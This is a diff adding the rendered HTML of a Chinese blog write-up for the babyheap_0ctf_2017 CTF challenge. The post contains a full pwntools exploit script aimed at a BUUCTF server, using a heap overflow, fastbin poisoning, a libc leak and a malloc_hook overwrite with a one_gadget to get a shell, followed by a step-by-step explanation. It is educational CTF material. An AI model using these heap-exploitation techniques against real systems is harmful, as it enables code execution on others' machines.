@@ -1,32 +1,181 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>babyheap_0ctf_2017-wp | refrain的blog</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博">
+<meta property="og:type" content="article">
+<meta property="og:title" content="babyheap_0ctf_2017-wp">
+<meta property="og:url" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/index.html">
+<meta property="og:site_name" content="refrain的blog">
+<meta property="og:description" content="前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-09-21T15:45:03.000Z">
+<meta property="article:modified_time" content="2021-10-22T09:50:52.080Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'babyheap_0ctf_2017-wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-22 17:50:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="refrain的blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">refrain的blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">babyheap_0ctf_2017-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-21T15:45:03.000Z" title="发表于 2021-09-21 23:45:03">2021-09-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-22T09:50:52.080Z" title="更新于 2021-10-22 17:50:52">2021-10-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="babyheap_0ctf_2017-wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p> 前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博客，思路其实是一样的，payload稍微有点偏差，大家可以去看看，说不定你们就不想看我的博客了（::&gt;_&lt;::），然后就是这样吧，还是想强调一下本文多文字思路，几乎无图。因为懒，所以想要真正看懂这题还是要去多看看我下面放的这两个参考博客吧。</p>
+<p>也不要说我没用，我怎么说也帮你在一堆讲的不太行的wp里放出了两个还行的。</p>
+<p>总的来说博客2更详细一点，稍微更推荐博客2一点，博客1在malloc_hook那边动手调了一下，各有所长吧，肯定比大部分要搜到的奇怪wp要好很多。</p>
+<p>参考博客1：<a target="_blank" rel="noopener" href="http://pearcechn.top/2021/02/02/[writeup]buuctf-pwnheap_1/">http://pearcechn.top/2021/02/02/%E3%80%90writeup%E3%80%91buuctf-pwnheap_1/</a></p>
+<p>参考博客2：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xieyichensss/article/details/116071092">https://blog.csdn.net/xieyichensss/article/details/116071092</a></p>
+<p><strong>特别提醒，源码里面的‘与“不知道为什么复制粘贴过来就变成奇怪的格式，所以除非你愿意一个个改’与”，不建议使用本文源码，上面博客的源码与本文思路相同，可以参考</strong></p>
+<span id="more"></span>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
-
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
-
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+<h1 id="1-源码（请注意看前言的特别提醒！！！！！！！）"><a href="#1-源码（请注意看前言的特别提醒！！！！！！！）" class="headerlink" title="1.源码（请注意看前言的特别提醒！！！！！！！）"></a>1.源码（请注意看前言的特别提醒！！！！！！！）</h1><p>from pwn import *<br>#context.log_level = “debug”<br>p = remote(‘node4.buuoj.cn’,26841)<br>#p = process(‘./babyheap_0ctf_2017’)<br>elf = ELF(‘./babyheap_0ctf_2017’)<br>one_gadget = 0x4526a<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)<br>libc = ELF(‘./libc-2.23-buu.so’)<br>def alloc(size):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”1”)<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(size))<br>def fill(idx,content):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”2”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(len(content)))<br>    p.recvuntil(b”Content: “)<br>    p.send(content)<br>def free(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’3’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>def dump(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”4”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvline()<br>    return p.recvline()</p>
+<p>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x80)</p>
+<p>free(1)<br>free(2)</p>
+<p>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>payload += p64(0)*3<br>payload += p64(0x21)<br>payload += p8(0x80)<br>fill(0,payload)<br>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>fill(3,payload)<br>alloc(0x10)<br>alloc(0x10)<br>payload = p64(0)*3<br>payload += p64(0x91)<br>fill(3,payload)<br>alloc(0x80)<br>free(4)</p>
+<p>libc_base = u64(dump(2)[:8].strip().ljust(8, b”\x00”))-0x3c4b78#0x3c4b20+0x58=0x3cb78<br>success(‘libc_base =’ +hex(libc_base))<br>alloc(0x60)<br>free(4)<br>payload = p64(libc_base+0x3c4aed)<br>fill(2,payload)<br>alloc(0x60)<br>alloc(0x60)#fakechunk<br>payload = p8(0)*3+p64(0)*2<br>payload += p64(libc_base+one_gadget)<br>fill(6,payload)<br>#gdb.attach(p)<br>alloc(0x255)</p>
+<p>p.interactive()</p>
+<h1 id="2-一点点基础知识"><a href="#2-一点点基础知识" class="headerlink" title="2.一点点基础知识"></a>2.一点点基础知识</h1><p>说思路之前先说一下这篇wp不会讲到特别多的基础知识点</p>
+<p>如果你学到堆题，却连chunk的数据结构都不清楚，我个人也不是很推荐你继续埋头刷题了。</p>
+<p>然后有些人可能不知道去哪里学习这些堆的基础内容，我个人的建议是ctfwiki有一个较为完整的框架，可以去看看，但观感就像老师纯念ppt一样，堆一些新手可能不是很友好，所以b站直接搜pwn其实也有不少讲的还行的培训，两者搭配起来，只论底层原理的话感觉也不算很难，应该很容易就可以搞定了。</p>
+<p>不过最近刚好在看glibc内存管理，手上刚好有个图，发出来给大伙儿看看，侵删，大概是这样，我就不做多的讲解了，细节性的东西自己去研究吧。</p>
+<p><img src="/2021/09/21/babyheap-0ctf-2017-wp/1.png" alt="1"></p>
+<p><img src="/2021/09/21/babyheap-0ctf-2017-wp/2.png" alt="2"></p>
+<p>chunk大概就是这样，如果没有基础看起来肯定也很复杂，但还是那句话这也不该是我在wp里慢慢告诉你的东西，然后就是ubuntu16采用的还是fastbin而不是tache，这题也是主要利用fastbin进行攻击的。这部分内容感觉内存管理这个pdf里讲的就不算特别详细了，如果不明白的就在我刚刚说的那几种学习方式去自己学吧。</p>
+<p>ida的逆向过程我不是很想放…有点懒了,别的wp应该也讲了很多了，对着看看就好。</p>
+<h1 id="3-总体思路"><a href="#3-总体思路" class="headerlink" title="3.总体思路"></a>3.总体思路</h1><p>首先想说的是，buu的刷题路线感觉很陡峭，如果刚从栈题切换到堆题，可能会很迷茫，因为在栈题里面，我们一般就盯着ret address把他劫持了就行了…但是在堆题里，哪怕了解了chunk的结构，我们也有点无从下手，不知道该如何利用，这里先不多说，我反正当时这个想法很强烈，在题目里感悟就好</p>
+<p>到这里，我们终于可以开始讲这题的思路了，总体思路是泄露libc基址，这样我们可以获得malloc_hook的地址，然后更改malloc_hook，把一个one_gadget放进去，这样调用malloc_hook的时候就会变成调用one_gadget从而控制程序执行流。</p>
+<p>可能会有人去问malooc_hook是什么，我的建议是baidu or google</p>
+<p>然后再细化一点</p>
+<p>我们最开始在前面alloc来free去，目的其实就是为了获得指向同一个0x80堆块的两个指针，获得双指针这也是double free 与uaf的思想，个人认为也是堆题里面很重要的一个思想，为什么需要指向同一个堆块里的两个指针呢？这个的话要具体情况具体分析，比如在本题，我们需要获得libc_base从而获得malloc_hook,需要用到unsorted bin里的一个特性，当unsorted bin里只有一个chunk时，这个chunk的fd和bk指针将会指向main_arena+0x58,而main_arena又与libc_base有固定偏移，至少在ubuntu16里偏移应该是0x3c4b20。于是我们知道了固定偏移减去就可以得到libc_base，但是说起来很简单的一个事情，想要实现的关键是什么呢？那就是读取放入unsortedbin的那个chunk的bk指针，那么我们从ida的逆向分析中可以得知，被free放入各种bin中的chunk是无法被dump（打印功能）的，但是如果我们此时拥有一个双指针，一个指针被free了，但是另外一个并没有，对于这个指针来说，他就可以直接把fd指针dump出来。</p>
+<p>然后这题获得指向0x80的两个指针的方法是什么呢？我们alloc(0x10)四次，依次为chunk 0 1 2 3 然后alloc(0x80)，为chunk 4，然后这个时候我们把1和2free了，1和2free以后会进入fastbin，至于为什么要扔进fastbin，因为相较于其他bin单链表结构会很方便处理，也没有unlink检测什么的，然后我们通过修改chunk 2的fd指向chunk 4，如何修改chunk 2呢，被free的chunk也是不能用fill修改的！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！但是我们的fill函数是没有越界检查的！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！这也是本题最大的漏洞，于是我们就fill(0,payload)从chunk0一点点溢出到chunk2并且改了他的fd（至于payload的构成和chunk数据结构有关，在此不多赘述，可以自己用gdb调一调），并且fastbin也是有检测的，我们需要将chunk4的size位改小，因为fastbin是有限制的，所以就有了fill（3，payload）这一步，这里我们改的是0x21，然后fastbin是和堆一样先进后出的，所以后进的chunk2会被第一个调用，然后会去看chunk2的fd指针，就等于把chunk 4 也放进了fastbin，于是这个时候我们再alloc两次，第一次把chunk2放在了chunk1的位置，第二次把chunk4放在了chunk2的位置，于是这个时候我们的chunk2和chunk4都指向了chunk4，这里我们需要注意总结的是什么呢，我们的chunk4是从来没有被真正放入fastbin中的，只是fastbin以为里面chunk4进去了，所以才会造成这样的后果，简单来说就是我们做了这么多都是在欺骗fastbin。那么这个时候我们再把chunk4free掉，chunk4就被扔进unsortedbin（如果不知道啥时候进什么bin也是要自己去学学的）然后这个时候chunk4的指针已经不能dump了，但我们还有chunk2的指针，于是我们通过dump（2）并且稍微处理下数据并接收，顺利获得main_arena，下面也就顺利获得了libc_base和malloc_hook</p>
+<p>然后这个时候我们就可以开始攻击了，这里我也懒得放图了，自己可以去看看我放的两个参考博客的图文都很详细，大概构造思路就是我们来到malloc_hook-0x23的位置，因为这里附近有一个单独的7f这个数据，可以构造为我们的size位。于是我们还是老手法，通过修改fd指针，构造出一个在malloc_hook-0x23的fakechunk，然后因为隔了0x23，把内存对齐到malloc_hook处把one_gadget扔进去就行。</p>
+<p>总结一下思路就是，扔进fastbin里然后改fd改size，从而制造出各种fakechunk来实现我们的最终目的。</p>
+<p>最后还是想说因为我懒并且觉得也没啥人看我博客，所以我就纯当自己梳理思路了，真正想看懂这题肯定还是离不开我开头的两篇参考博客。也不要说我毫无作用吧，至少我帮你们在一堆看不懂的wp里面找了两个稍微能看懂的。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/">http://example.com/2021/09/21/babyheap-0ctf-2017-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">refrain的blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/03/fastbin-attack/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">fastbin attack</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pwn buuctf rip 简单栈溢出 详细wp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E6%BA%90%E7%A0%81%EF%BC%88%E8%AF%B7%E6%B3%A8%E6%84%8F%E7%9C%8B%E5%89%8D%E8%A8%80%E7%9A%84%E7%89%B9%E5%88%AB%E6%8F%90%E9%86%92%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">1.源码（请注意看前言的特别提醒！！！！！！！）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E4%B8%80%E7%82%B9%E7%82%B9%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">2.一点点基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">3.总体思路</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/21/heap-extend-heapcreator/" title="heap_extend heapcreator"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="heap_extend heapcreator"/></a><div class="content"><a class="title" href="/2021/10/21/heap-extend-heapcreator/" title="heap_extend heapcreator">heap_extend heapcreator</a><time datetime="2021-10-21T12:13:36.000Z" title="发表于 2021-10-21 20:13:36">2021-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/15/unlink/" title="unlink"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unlink"/></a><div class="content"><a class="title" href="/2021/10/15/unlink/" title="unlink">unlink</a><time datetime="2021-10-14T16:15:59.000Z" title="发表于 2021-10-15 00:15:59">2021-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/09/unsortedbin-attack/" title="unsortedbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unsortedbin attack"/></a><div class="content"><a class="title" href="/2021/10/09/unsortedbin-attack/" title="unsortedbin attack">unsortedbin attack</a><time datetime="2021-10-09T14:43:59.000Z" title="发表于 2021-10-09 22:43:59">2021-10-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/03/fastbin-attack/" title="fastbin attack"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastbin attack"/></a><div class="content"><a class="title" href="/2021/10/03/fastbin-attack/" title="fastbin attack">fastbin attack</a><time datetime="2021-10-03T14:35:36.000Z" title="发表于 2021-10-03 22:35:36">2021-10-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/21/babyheap-0ctf-2017-wp/" title="babyheap_0ctf_2017-wp"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="babyheap_0ctf_2017-wp"/></a><div class="content"><a class="title" href="/2021/09/21/babyheap-0ctf-2017-wp/" title="babyheap_0ctf_2017-wp">babyheap_0ctf_2017-wp</a><time datetime="2021-09-21T15:45:03.000Z" title="发表于 2021-09-21 23:45:03">2021-09-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
